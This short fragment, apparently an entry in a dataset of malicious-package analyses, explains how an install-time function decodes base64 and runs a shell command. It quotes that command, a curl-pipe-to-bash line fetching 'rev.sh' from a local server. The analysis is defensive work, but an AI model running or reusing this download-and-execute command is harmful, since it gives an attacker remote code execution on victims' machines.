This function decodes a base64-encoded string and passes it to os.system, resulting in the execution of the following shell command: 'curl  -s http://localhost:8000/rev.sh | bash'. This downloads and executes a shell script from a local web server, which is a common technique for running arbitrary code on the victim's machine. This behavior is highly indicative of a malicious package, as it enables remote code execution during installation without the user's knowledge.",
